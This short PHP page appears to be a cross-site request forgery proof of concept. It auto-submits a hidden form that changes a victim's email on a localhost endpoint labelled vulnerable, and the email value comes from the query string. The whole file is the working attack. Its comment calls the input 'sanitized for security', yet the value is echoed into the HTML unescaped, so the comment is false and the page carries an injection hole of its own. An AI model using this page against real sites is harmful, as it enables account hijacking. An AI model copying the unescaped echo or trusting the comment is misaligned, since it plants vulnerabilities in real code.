<?php

$link = "http://localhost:8080/user/settings/update-email-vulnerable"; // The link to the vulnerable action
$email = $_GET['email']; // The email to be sent, sanitized for security

?>



<html>
    <body>
        <form action="<?php echo $link; ?>" method="POST">
            <input type="hidden" name="email" value="<?php echo $email; ?>" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
        
    </body>
</html>